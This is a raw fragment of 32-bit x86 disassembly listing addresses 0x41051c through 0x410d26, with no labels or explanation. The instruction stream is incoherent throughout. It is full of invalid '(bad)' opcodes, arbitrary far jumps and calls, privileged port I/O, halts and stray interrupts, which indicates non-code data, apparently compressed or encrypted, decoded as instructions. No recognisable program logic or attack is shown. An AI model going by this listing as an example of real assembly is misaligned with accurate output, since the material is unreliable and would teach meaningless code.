  41051c:	or     eax,0x70903d3a
  410521:	dec    ebp
  410522:	nop
  410523:	psadbw mm5,QWORD PTR [eax-0x60632d75]
  41052a:	dec    esp
  41052b:	pop    ebx
  41052c:	and    eax,0xbd61ad9e
  410531:	xchg   edx,eax
  410532:	fcmovne st,st(5)
  410534:	jmp    0x3e79:0x94747461
  41053b:	xchg   edx,eax
  41053c:	jo     0x410533
  41053e:	ds pop ecx
  410540:	mov    ecx,0x7464729b
  410545:	aam    0x1f
  410547:	aaa    
  410548:	jns    0x4105c1
  41054a:	out    0xd3,eax
  41054c:	xor    DWORD PTR [edi+ebp*8],esp
  41054f:	sbb    DWORD PTR [esi+edx*8],ebx
  410552:	push   ebx
  410553:	loope  0x410545
  410555:	dec    edi
  410556:	mov    esp,DWORD PTR [ecx-0x47977b7e]
  41055c:	jg     0x410518
  41055e:	leave  
  41055f:	js     0x4105af
  410561:	jmp    0x50fefed1
  410566:	bound  ecx,QWORD PTR [esi]
  410568:	lahf   
  410569:	data16 jg 0x4105a9
  41056c:	pop    ds
  41056d:	push   esp
  41056e:	and    BYTE PTR [esi],ah
  410570:	retf   
  410571:	and    ecx,ebx
  410573:	mov    ecx,0x541ace48
  410578:	xchg   esp,eax
  410579:	mov    ?,WORD PTR [edi+0x58]
  41057c:	pop    ds
  41057d:	xchg   eax,esi
  41057f:	jno    0x41051c
  410581:	ja     0x4105fe
  410583:	lods   al,BYTE PTR ds:[esi]
  410584:	mov    eax,ds:0x4e4bda5a
  410589:	stos   DWORD PTR es:[edi],eax
  41058a:	and    BYTE PTR [ebx],bh
  41058c:	fild   QWORD PTR ds:0x661647a4
  410592:	mov    esp,0xf4797273
  410597:	or     al,0x81
  410599:	mov    ch,0x79
  41059b:	test   ebp,eax
  41059d:	pushf  
  41059e:	rol    BYTE PTR [ebp-0x29],0x28
  4105a2:	mov    BYTE PTR [eax],0xca
  4105a5:	xchg   ebp,eax
  4105a6:	push   edi
  4105a7:	rcl    BYTE PTR [ebx],1
  4105a9:	sub    al,0xe6
  4105ab:	mul    DWORD PTR [ecx+ecx*1+0x234f9003]
  4105b2:	sub    DWORD PTR [edi-0x80],esi
  4105b5:	outs   dx,BYTE PTR ds:[esi]
  4105b6:	(bad)  
  4105b7:	pop    esp
  4105b8:	dec    edi
  4105b9:	pop    ss
  4105ba:	xor    al,0x26
  4105bc:	call   0x674c:0xde2a6c6f
  4105c3:	inc    ecx
  4105c4:	mov    WORD PTR [esi-0x3],es
  4105c7:	das    
  4105c8:	call   0xe4f:0x56fba24b
  4105cf:	xchg   ebx,eax
  4105d0:	in     eax,0xb9
  4105d2:	mov    esi,0x6ac447bd
  4105d7:	mov    al,0xdc
  4105d9:	int    0x72
  4105db:	sub    DWORD PTR [esi],ebp
  4105dd:	jo     0x41063f
  4105df:	xchg   esp,eax
  4105e0:	mov    eax,ds:0x9683725c
  4105e5:	retf   0x4aee
  4105e8:	pop    ss
  4105e9:	xchg   ebx,eax
  4105ea:	frstor [eax]
  4105ec:	sti    
  4105ed:	ja     0x410644
  4105ef:	xor    DWORD PTR [esi+ebp*2+0x6c],ebx
  4105f3:	xor    ah,ch
  4105f5:	loop   0x41063b
  4105f7:	enter  0x6da9,0xb3
  4105fb:	fs cmp eax,0xfd5ae617
  410601:	in     eax,0xeb
  410603:	(bad)  [eax-0x337bad7d]
  410609:	(bad)  
  41060a:	(bad)  
  41060c:	loope  0x41061d
  41060e:	mov    ah,dl
  410610:	mov    cl,0x4e
  410612:	and    ebp,ebp
  410614:	mov    eax,ds:0x4a480a72
  410619:	mov    edi,DWORD PTR [esi-0x44]
  41061c:	xor    DWORD PTR [eax+ecx*1-0x14],ebx
  410620:	aaa    
  410621:	fldenv [ebp-0xc]
  410624:	xor    al,0x12
  410626:	pop    eax
  410627:	pop    ss
  410628:	sbb    BYTE PTR [esi-0x1d249b35],0x72
  41062f:	add    al,0x36
  410631:	jnp    0x41063a
  410633:	add    al,0xa6
  410635:	inc    ebp
  410636:	(bad)  [ecx-0x64]
  410639:	jmp    0x31825620
  41063e:	ror    BYTE PTR [edi-0x276c6f81],cl
  410644:	(bad)  
  410645:	call   0xa780:0x9fea6590
  41064c:	jns    0x4106b9
  41064e:	test   ecx,ebp
  410650:	mov    edx,0xeb050a0c
  410655:	mov    cl,0xa4
  410657:	xor    al,BYTE PTR [edi-0x57]
  41065a:	outs   dx,DWORD PTR ds:[esi]
  41065b:	fwait
  41065c:	imul   DWORD PTR [esi-0x39]
  41065f:	dec    ebp
  410660:	pop    ss
  410661:	xor    BYTE PTR [ebx+0x4644003b],ah
  410667:	out    dx,al
  410668:	pop    ds
  410669:	imul   esp,DWORD PTR [esi+0x20c7bab9],0xcf1db5f9
  410673:	leave  
  410674:	ins    DWORD PTR es:[edi],dx
  410675:	mov    ?,WORD PTR [eax+eax*4]
  410678:	icebp  
  410679:	dec    eax
  41067a:	bound  edx,QWORD PTR [eax]
  41067c:	das    
  41067d:	gs fwait
  41067f:	or     DWORD PTR [edi+0x4a6a5689],esp
  410685:	jo     0x41069d
  410687:	mov    cl,0x10
  410689:	and    esi,ebp
  41068b:	sar    DWORD PTR [ecx+eax*4],cl
  41068e:	sbb    BYTE PTR [edx],bl
  410690:	add    DWORD PTR [eax+0x62001d36],ecx
  410696:	je     0x410637
  410698:	jo     0x4106e2
  41069a:	mov    ch,0xe0
  41069c:	cld    
  41069d:	out    0xdd,eax
  41069f:	or     al,0x6e
  4106a1:	addr16 mov ebx,0x79142f4b
  4106a7:	mov    WORD PTR [edx-0x72],es
  4106aa:	(bad)  
  4106ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ac:	xor    esi,esi
  4106ae:	sbb    BYTE PTR fs:[edi-0x603132da],cl
  4106b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106b6:	sbb    dh,dl
  4106b8:	and    eax,DWORD PTR [ebp+esi*4-0x37b1af35]
  4106bf:	ret    
  4106c0:	pop    edx
  4106c1:	mov    WORD PTR [edi+0x5f],ds
  4106c4:	aad    0x1f
  4106c6:	outs   dx,BYTE PTR ds:[esi]
  4106c7:	scas   al,BYTE PTR es:[edi]
  4106c8:	cmp    BYTE PTR [ecx],0x42
  4106cb:	in     al,0x79
  4106cd:	sub    al,0x89
  4106cf:	mov    ebx,0x21a739a7
  4106d4:	or     al,0x55
  4106d6:	push   ss
  4106d7:	test   al,0xec
  4106d9:	inc    esp
  4106da:	adc    DWORD PTR [ebx+edx*2],0x98acc47c
  4106e1:	push   cs
  4106e2:	dec    ebp
  4106e3:	lock mov esp,0xcac54b6d
  4106ea:	or     eax,0xe95b73a6
  4106ef:	lock sub cl,al
  4106f2:	adc    DWORD PTR fs:[edi],eax
  4106f5:	icebp  
  4106f6:	add    ah,BYTE PTR [edx]
  4106f8:	mov    ebx,DWORD PTR [ebx+ebx*8-0x19]
  4106fc:	(bad)  
  4106fd:	fcomp  DWORD PTR [esi+ebp*4+0x267bb4a7]
  410704:	test   al,0x9c
  410706:	push   es
  410707:	jo     0x410734
  410709:	(bad)  
  41070a:	jg     0x410718
  41070c:	call   edi
  41070e:	(bad)  
  41070f:	mov    eax,fs:0xa4efac8
  410715:	adc    BYTE PTR [edx],bl
  410717:	mov    al,0x52
  410719:	xor    esi,DWORD PTR [ebp-0x73]
  41071c:	je     0x4106ff
  41071e:	inc    edi
  41071f:	and    esp,DWORD PTR [eax+0x3120c2de]
  410725:	mov    cl,0x23
  410727:	mov    WORD PTR [ebx+ebp*8-0x9bf73a7],gs
  41072e:	hlt    
  41072f:	lods   eax,DWORD PTR ds:[esi]
  410730:	pusha  
  410731:	mov    dl,0xf9
  410733:	aaa    
  410734:	mov    ch,0x4d
  410736:	add    al,0x51
  410738:	sbb    edx,eax
  41073a:	mov    ecx,0xd7e60db7
  41073f:	pusha  
  410740:	mov    ds:0xd8a99cca,al
  410745:	mov    BYTE PTR [ebx-0x42],al
  410748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410749:	mov    al,0x24
  41074b:	fs or  eax,0xb10f84e0
  410751:	test   al,0x12
  410753:	xlat   BYTE PTR ds:[ebx]
  410754:	mov    ch,0xd2
  410756:	xchg   DWORD PTR [edx+ebx*1],edx
  410759:	xlat   BYTE PTR ds:[ebx]
  41075a:	mov    eax,ds:0xad455a6
  41075f:	fst    st(3)
  410761:	xchg   ecx,eax
  410762:	(bad)  
  410763:	fcom   DWORD PTR [eax+0x548f2996]
  410769:	cmp    ch,BYTE PTR [ebx-0x75]
  41076c:	repz pop edi
  41076e:	add    ecx,esi
  410770:	push   ebx
  410771:	popa   
  410772:	sbb    DWORD PTR [ebp+0x6ff5c2f2],esp
  410778:	(bad)  
  410779:	fstp   TBYTE PTR [ecx+ebx*1+0x4c]
  41077d:	sbb    ecx,DWORD PTR [eax-0x35688b82]
  410783:	mov    esi,0xbce51843
  410788:	adc    BYTE PTR [esi-0x4],dh
  41078b:	add    al,0x12
  41078d:	sub    BYTE PTR ds:0x3eec25ce,dl
  410793:	arpl   WORD PTR [ebx+0x34],cx
  410796:	or     al,0x78
  410798:	fcomp  DWORD PTR [ecx-0x1b]
  41079b:	hlt    
  41079c:	mov    ah,BYTE PTR [eax+0x5d]
  41079f:	es mov ebp,0x270390f1
  4107a5:	inc    edx
  4107a6:	(bad)  
  4107a7:	mov    cl,0xc3
  4107a9:	and    al,0x92
  4107ab:	jbe    0x410748
  4107ad:	jb     0x410794
  4107af:	mov    gs,WORD PTR [ebp+0x97c0082]
  4107b5:	jg     0x410821
  4107b7:	mov    dl,0xf
  4107b9:	push   ds
  4107ba:	xor    DWORD PTR [esi],ebx
  4107bc:	std    
  4107bd:	mov    ecx,0x64311765
  4107c2:	mov    esi,0x46ab45c9
  4107c7:	dec    esp
  4107c8:	shl    ch,0x25
  4107cb:	pop    eax
  4107cc:	aas    
  4107cd:	mov    dh,0xc9
  4107cf:	pop    eax
  4107d0:	std    
  4107d1:	and    ebp,ebx
  4107d3:	cli    
  4107d4:	mul    DWORD PTR [eax]
  4107d6:	es sbb al,0xda
  4107d9:	sbb    eax,0x256648a8
  4107de:	cmp    al,0x23
  4107e0:	sub    eax,0xc8440549
  4107e5:	test   al,0xd3
  4107e7:	into   
  4107e8:	stc    
  4107e9:	inc    edx
  4107ea:	sub    al,0x3
  4107ec:	xor    eax,0xbd63a969
  4107f1:	inc    ecx
  4107f2:	sub    al,0x61
  4107f4:	sub    al,0xd6
  4107f6:	jmp    0x41084e
  4107f8:	and    BYTE PTR ds:0xc3cd13d8,bh
  4107fe:	fdiv   DWORD PTR [ebx-0x14aa037d]
  410804:	adc    ebx,ebp
  410806:	dec    edx
  410807:	jmp    0xba9fda83
  41080c:	call   0x44e70064
  410811:	pop    ds
  410812:	imul   BYTE PTR [ebx]
  410814:	ins    BYTE PTR es:[edi],dx
  410815:	mov    ebp,0x260c0fd1
  41081a:	pop    ds
  41081b:	cmp    al,0x99
  41081d:	arpl   WORD PTR [ebx+0x35f49e11],di
  410823:	repnz in eax,dx
  410825:	lods   al,BYTE PTR ds:[esi]
  410826:	add    eax,0xd65e547e
  41082b:	inc    edx
  41082c:	jmp    0x410875
  41082e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41082f:	popa   
  410830:	adc    DWORD PTR [edx-0x61],ebp
  410833:	cmp    ch,BYTE PTR [edx+ebx*2]
  410836:	sti    
  410837:	sub    dh,BYTE PTR [eax-0x6cd658d7]
  41083d:	scas   eax,DWORD PTR es:[edi]
  41083e:	cmc    
  41083f:	test   eax,0xd3334a83
  410844:	pop    ebp
  410845:	push   eax
  410846:	arpl   dx,bp
  410848:	shr    DWORD PTR [esi],0xa4
  41084b:	hlt    
  41084c:	jne    0x410885
  41084e:	lahf   
  41084f:	pop    eax
  410850:	rep outs dx,DWORD PTR ds:[esi]
  410852:	pop    ecx
  410853:	fmul   QWORD PTR [esi-0x1584e361]
  410859:	fcomp  QWORD PTR [ebx-0x5ae3e3b3]
  41085f:	(bad)  
  410861:	mov    bl,0x93
  410863:	add    DWORD PTR [edx+eiz*2-0x33],edi
  410867:	ins    DWORD PTR es:[edi],dx
  410868:	pop    edx
  410869:	leave  
  41086a:	dec    esi
  41086b:	push   cs
  41086c:	pop    ds
  41086d:	jp     0x4108d8
  41086f:	adc    ebx,ecx
  410871:	mov    ah,0x85
  410873:	aad    0x8e
  410875:	push   esp
  410876:	icebp  
  410877:	sahf   
  410878:	shr    BYTE PTR [edi-0x315dfb04],0xe4
  41087f:	jl     0x41083a
  410881:	jb     0x410813
  410883:	dec    edi
  410884:	dec    BYTE PTR [esi]
  410886:	fwait
  410887:	and    BYTE PTR [esi+0x57cd04ce],cl
  41088d:	dec    ebp
  41088e:	aaa    
  41088f:	int    0x4
  410891:	jp     0x4108f7
  410893:	aad    0xf2
  410895:	jo     0x4108f5
  410897:	jno    0x410852
  410899:	dec    BYTE PTR [ecx-0x48003bdf]
  41089f:	test   eax,0xe259372b
  4108a4:	clc    
  4108a5:	hlt    
  4108a6:	adc    bl,cl
  4108a8:	loopne 0x41090b
  4108aa:	and    BYTE PTR [edx-0x7d7966c2],cl
  4108b0:	aad    0xf1
  4108b2:	mov    esp,0x4be47889
  4108b7:	mov    ch,0x74
  4108b9:	adc    edi,DWORD PTR [edi]
  4108bb:	jmp    0xb2652596
  4108c0:	or     ebx,DWORD PTR [ebx]
  4108c2:	mov    cl,0x7
  4108c4:	and    DWORD PTR [eax+edi*4],ecx
  4108c7:	xchg   edx,eax
  4108c8:	popf   
  4108c9:	mov    ch,0xdc
  4108cb:	dec    ebx
  4108cc:	mov    esi,0x12fe9ab2
  4108d1:	jp     0x4108b6
  4108d3:	pusha  
  4108d4:	call   0xe47e35e5
  4108d9:	and    ebx,esp
  4108db:	xchg   edx,eax
  4108dc:	sub    al,0x18
  4108de:	int    0x32
  4108e0:	pop    esp
  4108e1:	popf   
  4108e2:	and    DWORD PTR [ebx],ebp
  4108e4:	outs   dx,DWORD PTR ds:[esi]
  4108e5:	imul   ecx,DWORD PTR [edi-0x73215158],0xffffffa9
  4108ec:	cmp    al,0xf0
  4108ee:	jmp    0x410945
  4108f0:	push   ds
  4108f1:	je     0x410972
  4108f3:	sbb    eax,DWORD PTR [ecx+0x551908be]
  4108f9:	cwde   
  4108fa:	jno    0x41094a
  4108fc:	dec    DWORD PTR [ebx]
  4108fe:	pusha  
  4108ff:	adc    al,0x32
  410901:	fnstcw WORD PTR [edi]
  410903:	add    al,0x37
  410905:	xchg   edx,eax
  410906:	mov    DWORD PTR [esi],eax
  410908:	cmp    DWORD PTR [ecx],edi
  41090a:	inc    ebp
  41090b:	adc    bh,bh
  41090d:	ror    BYTE PTR [eax+0xebf817e],1
  410913:	frstor [ecx]
  410915:	ret    
  410916:	or     bl,BYTE PTR [ecx]
  410918:	and    al,0x17
  41091a:	inc    edi
  41091b:	push   esi
  41091c:	xchg   edx,eax
  41091d:	adc    ebx,DWORD PTR [eax+ebp*2+0x8]
  410921:	mov    BYTE PTR [ecx+0xe43df6d],al
  410927:	fwait
  410928:	test   BYTE PTR [edi+0x2cc4193f],bl
  41092e:	or     BYTE PTR [edi],0x97
  410931:	xlat   BYTE PTR ds:[ebx]
  410932:	ret    
  410933:	mov    eax,0xec959e86
  410938:	(bad)  
  410939:	loopne 0x410905
  41093b:	and    eax,0xe2b61c42
  410940:	ins    DWORD PTR es:[edi],dx
  410941:	push   edi
  410942:	mov    edx,0xd48803e6
  410947:	stc    
  410948:	sbb    BYTE PTR [ecx+0x78bfc5ac],ch
  41094e:	scas   al,BYTE PTR es:[edi]
  41094f:	jmp    FWORD PTR [ecx+0x48]
  410952:	xchg   edx,eax
  410953:	ins    BYTE PTR es:[edi],dx
  410954:	mov    ?,WORD PTR [ebp+0x3436beb0]
  41095a:	push   eax
  41095b:	rol    esp,cl
  41095d:	out    0x27,al
  41095f:	pop    ebp
  410960:	cli    
  410961:	fldenv [edx-0x7e]
  410964:	mov    ds,WORD PTR [ebp+0x7f873e15]
  41096a:	into   
  41096b:	push   esi
  41096c:	or     ebp,ecx
  41096e:	lods   al,BYTE PTR ds:[esi]
  41096f:	add    eax,0xb1b8e92d
  410974:	cwde   
  410975:	jmp    DWORD PTR [ebx+0x59]
  410978:	jle    0x4109e5
  41097a:	lds    cx,DWORD PTR [edi]
  41097d:	cwde   
  41097e:	out    dx,eax
  41097f:	ins    DWORD PTR es:[edi],dx
  410980:	add    eax,0x7550ca54
  410985:	out    dx,al
  410986:	dec    edi
  410987:	ds push ds
  410989:	cmp    BYTE PTR [edx],ch
  41098b:	jp     0x41097a
  41098d:	hlt    
  41098e:	shl    al,0x9
  410991:	or     BYTE PTR [edx+0x5b0dfd12],cl
  410997:	ja     0x410933
  410999:	adc    dh,BYTE PTR [esp+ecx*8]
  41099c:	add    BYTE PTR [eax-0x354bcbae],al
  4109a2:	es (bad) 
  4109a4:	or     ecx,DWORD PTR [edx]
  4109a6:	jne    0x410a21
  4109a8:	and    al,0x30
  4109aa:	sti    
  4109ab:	mov    ds:0xd813d9c3,al
  4109b0:	rol    eax,1
  4109b2:	mov    ch,0xde
  4109b4:	or     al,BYTE PTR [edi+edi*2]
  4109b7:	sub    ah,dh
  4109b9:	inc    esi
  4109ba:	jge    0x4109da
  4109bc:	in     al,0x65
  4109be:	mov    ch,0xb4
  4109c0:	or     cl,BYTE PTR [ebx+0x31]
  4109c3:	in     al,dx
  4109c4:	or     dh,ah
  4109c6:	adc    al,0xba
  4109c8:	sbb    edi,DWORD PTR [ebx]
  4109ca:	inc    edi
  4109cb:	or     eax,0x49b40270
  4109d0:	cwde   
  4109d1:	addr16 call 0x6f3a:0x2085768e
  4109d9:	or     DWORD PTR [edi-0x7d],eax
  4109dc:	jbe    0x41098b
  4109de:	mov    ebp,DWORD PTR [esi+eiz*1+0x3f]
  4109e2:	enter  0xf9b9,0x12
  4109e6:	punpckhwd mm5,mm5
  4109e9:	adc    DWORD PTR [esi-0x3],0xc
  4109ed:	add    eax,0x917ed66
  4109f2:	push   edi
  4109f3:	or     al,0x1c
  4109f5:	je     0x4109e2
  4109f7:	rcr    DWORD PTR [esi+0x22833cd6],cl
  4109fd:	jp     0x410a43
  4109ff:	or     eax,0x3ffa6deb
  410a04:	mov    ch,0xf
  410a06:	push   ss
  410a07:	mov    bl,0x12
  410a09:	mov    ch,0x6a
  410a0b:	mov    esp,0x46557085
  410a10:	pop    es
  410a11:	ins    DWORD PTR es:[edi],dx
  410a12:	out    0x1,eax
  410a14:	mov    bl,0xba
  410a16:	pop    ss
  410a17:	in     eax,0x84
  410a19:	inc    ebx
  410a1a:	and    BYTE PTR [ebp-0x44],dh
  410a1d:	mov    cl,0x85
  410a1f:	sti    
  410a20:	hlt    
  410a21:	shr    BYTE PTR [ebx],cl
  410a23:	in     al,0x7
  410a25:	test   al,0x9c
  410a27:	shl    DWORD PTR [ebx-0x5d],1
  410a2a:	hlt    
  410a2b:	add    ecx,edx
  410a2d:	adc    al,0xa3
  410a2f:	jo     0x410a7c
  410a31:	imul   eax,DWORD PTR [edx+0x3e],0xffffffe8
  410a35:	push   0x3b
  410a37:	push   esp
  410a38:	dec    edi
  410a39:	frstor [eax+0x5e79512b]
  410a3f:	aam    0x57
  410a41:	icebp  
  410a42:	jbe    0x4109e6
  410a44:	xchg   ebp,eax
  410a45:	adc    al,dl
  410a47:	stc    
  410a48:	push   0xe5cc2b29
  410a4d:	fcomip st,st(6)
  410a4f:	mov    edi,0x2499b6ed
  410a54:	jb     0x410a92
  410a56:	test   eax,0xef911bbb
  410a5b:	and    DWORD PTR [ebx],ecx
  410a5d:	mov    cl,0x57
  410a5f:	int3   
  410a60:	adc    cl,ah
  410a62:	mov    dl,0x91
  410a64:	jg     0x410adf
  410a66:	mov    ecx,0xed372351
  410a6b:	adc    edi,DWORD PTR [ebp+0x78]
  410a6e:	xchg   ecx,eax
  410a6f:	and    BYTE PTR gs:[ebx+0x78ecef4],bh
  410a76:	cmp    DWORD PTR [eax-0x4ee5863b],eax
  410a7c:	dec    ebp
  410a7d:	cs mov eax,ebx
  410a80:	mov    ss,WORD PTR [ebx+0x7b7efeee]
  410a86:	xchg   ebx,eax
  410a87:	aas    
  410a88:	in     al,0x2c
  410a8a:	xchg   esp,eax
  410a8b:	shl    DWORD PTR ds:0x65312130,0xa8
  410a92:	mov    esp,0x5fdd3c49
  410a97:	sub    eax,0xe97e2dc2
  410a9c:	dec    eax
  410a9d:	repnz mov esi,0xed5c83a8
  410aa3:	push   0x6c
  410aa5:	and    BYTE PTR [edi-0x48],ah
  410aa8:	mov    dh,0x2e
  410aaa:	imul   edx,DWORD PTR [ebp+ebp*2-0x1f],0x7854ff74
  410ab2:	pop    edx
  410ab3:	fnstsw WORD PTR [esi+0x3c]
  410ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ab7:	sub    BYTE PTR [esi-0x63257bf3],dl
  410abd:	xchg   BYTE PTR [ebp-0x5d903b49],ch
  410ac3:	xchg   esp,eax
  410ac4:	test   al,al
  410ac6:	jnp    0x410aa7
  410ac8:	cdq    
  410ac9:	or     BYTE PTR [ebx+0xeac0eff],ah
  410acf:	repz stc 
  410ad1:	rcl    BYTE PTR [edx+ecx*8+0x12],0xc
  410ad6:	in     al,dx
  410ad7:	enter  0xc7a1,0x7
  410adb:	je     0x410b27
  410add:	call   0xc105bae7
  410ae2:	mov    eax,0xd3deffb4
  410ae7:	sub    ch,ch
  410ae9:	push   0x7da0c258
  410aee:	sub    DWORD PTR [ecx+0x23],0xa134efcb
  410af5:	sub    ch,ah
  410af7:	ficom  DWORD PTR [ecx]
  410af9:	rcr    DWORD PTR [ebp-0x33],1
  410afc:	fcmovnb st,st(4)
  410afe:	popa   
  410aff:	jmp    0xe5fe28bc
  410b04:	xchg   ebp,eax
  410b05:	sub    al,dh
  410b07:	dec    eax
  410b08:	jae    0x410b4e
  410b0a:	cdq    
  410b0b:	adc    ebp,DWORD PTR [ebx-0x28]
  410b0e:	lahf   
  410b0f:	cmp    edi,DWORD PTR [ebx]
  410b11:	in     eax,0xf8
  410b13:	mov    cl,0xad
  410b15:	stc    
  410b16:	bound  ecx,QWORD PTR ds:0xb1bdafd4
  410b1c:	sbb    al,0xfa
  410b1e:	or     ecx,ecx
  410b20:	mov    bh,0x97
  410b22:	mov    dh,0xa3
  410b24:	cmp    esp,DWORD PTR [esi]
  410b26:	lahf   
  410b27:	or     edx,ebp
  410b29:	pop    es
  410b2a:	ror    DWORD PTR [ebp+edx*8+0x1d],cl
  410b2e:	add    eax,0x8da6eddc
  410b33:	retf   
  410b34:	dec    esi
  410b35:	lds    esi,FWORD PTR [edi-0x37]
  410b38:	fmul   QWORD PTR [esi-0x50]
  410b3b:	mov    ecx,0x57f5c004
  410b40:	fwait
  410b41:	rcl    DWORD PTR [ebx],1
  410b43:	pusha  
  410b44:	iret   
  410b45:	jmp    0xbe16831c
  410b4a:	adc    eax,eax
  410b4c:	aad    0x61
  410b4e:	inc    esi
  410b4f:	sti    
  410b50:	out    dx,al
  410b51:	retf   0xa5db
  410b54:	xchg   ebx,eax
  410b55:	(bad)  
  410b56:	push   ebp
  410b57:	pop    edi
  410b58:	sbb    BYTE PTR [ebp+0x63c2f8a7],0xd3
  410b5f:	std    
  410b60:	(bad)  
  410b62:	call   0xad2bf26e
  410b67:	ins    DWORD PTR es:[edi],dx
  410b68:	sbb    al,0x30
  410b6a:	add    ebp,DWORD PTR [ecx]
  410b6c:	sub    ebp,eax
  410b6e:	jmp    0x4b7e:0xd794feec
  410b75:	sbb    BYTE PTR [esi+0x67],0x81
  410b79:	sub    ah,BYTE PTR [esp+ebp*2-0x4b446f8e]
  410b80:	adc    DWORD PTR [edx-0x7b],ebx
  410b83:	mov    eax,ds:0x7c6d89c
  410b88:	stc    
  410b89:	pop    ecx
  410b8a:	xchg   ebx,eax
  410b8b:	mov    dh,0x6b
  410b8d:	or     BYTE PTR [esi-0x67340f55],al
  410b93:	ins    BYTE PTR es:[edi],dx
  410b94:	mov    bl,0x92
  410b96:	ret    
  410b97:	rol    ecx,1
  410b99:	jl     0x410b37
  410b9b:	and    eax,DWORD PTR [ecx]
  410b9d:	xchg   BYTE PTR [edi],ch
  410b9f:	sar    esi,cl
  410ba1:	and    eax,0x32435b53
  410ba6:	mov    bh,0xd9
  410ba8:	fucomp st(6)
  410baa:	jae    0x410bf9
  410bac:	fmul   st(5),st
  410bae:	imul   eax,ebp,0xfffffffd
  410bb1:	(bad)  
  410bb3:	push   esp
  410bb4:	mov    ebx,0xf22cde0a
  410bb9:	fs push cs
  410bbb:	frstor [edx+0x17]
  410bbe:	sub    esi,DWORD PTR [ebp-0x1a]
  410bc1:	ss ret 
  410bc3:	or     BYTE PTR [edx+0x1],al
  410bc6:	adc    BYTE PTR [ebx-0x714eec1],al
  410bcc:	mov    bh,0x1f
  410bce:	mov    esi,0x137e5ab8
  410bd3:	sub    ebp,ebp
  410bd5:	jae    0x410b81
  410bd7:	jbe    0x410b5c
  410bd9:	sbb    ecx,eax
  410bdb:	ret    
  410bdc:	das    
  410bdd:	sbb    al,0x95
  410bdf:	call   0x25c2:0xa14d921f
  410be6:	xor    al,0x53
  410be8:	mov    ecx,DWORD PTR [eax]
  410bea:	retf   0xa8fa
  410bed:	jmp    0x410c3d
  410bef:	mov    esi,0xd4688186
  410bf4:	pop    es
  410bf5:	sbb    edi,DWORD PTR [esi+0x67dca348]
  410bfb:	(bad)  
  410bfc:	jns    0x410c17
  410bfe:	adc    al,0x7f
  410c00:	ret    
  410c01:	mov    ebp,0x40ffe2bc
  410c06:	aas    
  410c07:	xor    ebx,ebx
  410c09:	add    esp,esi
  410c0b:	(bad)  
  410c0c:	push   ebx
  410c0d:	mov    dl,0x3e
  410c0f:	mov    edi,0x70d34965
  410c14:	cdq    
  410c15:	mov    eax,0x72c2cfd5
  410c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1b:	pop    esi
  410c1c:	jae    0x410c4a
  410c1e:	mov    edi,0xf9d1d3bc
  410c23:	sbb    eax,0x36061033
  410c28:	iret   
  410c29:	cmp    DWORD PTR [eax+eax*2+0x27e0b097],ebp
  410c30:	mov    bh,0x5a
  410c32:	jmp    0xc27d:0xd5d7a409
  410c39:	(bad)  
  410c3a:	xor    eax,0xc96bd47c
  410c3f:	mov    bl,0xba
  410c41:	pop    edx
  410c42:	sub    BYTE PTR [ebp-0x38943341],dh
  410c48:	in     al,0xba
  410c4a:	repz or DWORD PTR [ebx+0xf],0x46572e9d
  410c52:	call   0x7773:0x18879b
  410c59:	adc    ch,ch
  410c5b:	mov    DWORD PTR [edi-0x1f7c93c9],ecx
  410c61:	test   BYTE PTR [ebx],ah
  410c63:	xor    al,BYTE PTR [ecx+0x55]
  410c66:	cmc    
  410c67:	sahf   
  410c68:	sub    cl,0x22
  410c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6c:	add    BYTE PTR [esi+0x36],ch
  410c6f:	xor    eax,0xe30c0901
  410c74:	inc    esp
  410c75:	pop    ebx
  410c76:	repz push eax
  410c78:	push   ecx
  410c79:	leave  
  410c7a:	ins    DWORD PTR es:[edi],dx
  410c7b:	pop    ecx
  410c7c:	daa    
  410c7d:	sbb    edi,DWORD PTR [edx-0x1d0fe1ff]
  410c83:	ss cdq 
  410c85:	cmp    DWORD PTR [eax],edx
  410c87:	lods   al,BYTE PTR ds:[esi]
  410c88:	jle    0x410ca0
  410c8a:	xor    dl,BYTE PTR [edi]
  410c8c:	and    eax,0x8329af82
  410c91:	arpl   WORD PTR [ebx-0x12200eb9],ax
  410c97:	mov    dl,0xc0
  410c99:	push   0x49ba480c
  410c9e:	(bad)  
  410c9f:	xchg   ecx,eax
  410ca0:	iret   
  410ca1:	sub    DWORD PTR [edx],0x61d1440c
  410ca7:	add    BYTE PTR [edi-0x8],ch
  410caa:	in     eax,0x6d
  410cac:	xchg   esp,eax
  410cad:	cdq    
  410cae:	aaa    
  410caf:	jl     0x410cda
  410cb1:	cld    
  410cb2:	rcr    BYTE PTR [esi+0xff002fb],0xcb
  410cb9:	push   DWORD PTR [edx+0x66]
  410cbc:	mov    al,ds:0x2688ccfb
  410cc1:	pop    ss
  410cc2:	enter  0x5e4c,0xff
  410cc6:	arpl   di,bp
  410cc8:	sbb    BYTE PTR [esi+0x69],0xb0
  410ccc:	mov    ebp,0x802e493c
  410cd1:	out    dx,al
  410cd2:	retf   
  410cd3:	xor    al,0x4e
  410cd5:	sub    BYTE PTR ds:0x7c892f,bl
  410cdb:	xchg   esp,eax
  410cdc:	pushf  
  410cdd:	cs push esi
  410cdf:	repz hlt 
  410ce1:	jnp    0x410d3d
  410ce3:	jae    0x410cc3
  410ce5:	jge    0x410d38
  410ce7:	outs   dx,DWORD PTR ds:[esi]
  410ce8:	lea    edi,[esp+edx*1]
  410ceb:	out    0xef,eax
  410ced:	xchg   esp,eax
  410cee:	cs into 
  410cf0:	mov    ah,BYTE PTR [eax+0x2e]
  410cf3:	sub    DWORD PTR [eax],ecx
  410cf5:	or     bl,BYTE PTR [ebp-0x1ca4d203]
  410cfb:	inc    esp
  410cfc:	adc    eax,0x5b408263
  410d01:	call   0xb3fd4a23
  410d06:	(bad)  
  410d07:	push   0xffffff81
  410d09:	or     bh,bl
  410d0b:	repnz nop
  410d0d:	pop    ebx
  410d0e:	out    dx,al
  410d0f:	xor    ebx,ecx
  410d11:	retf   0xe717
  410d14:	and    DWORD PTR [ecx+0x3b],0xd107280f
  410d1b:	pop    edx
  410d1c:	fisubr DWORD PTR [ebx+edi*4+0x5ffbe812]
  410d23:	jno    0x410d29
  410d25:	std    
  410d26:	out    0x53,al
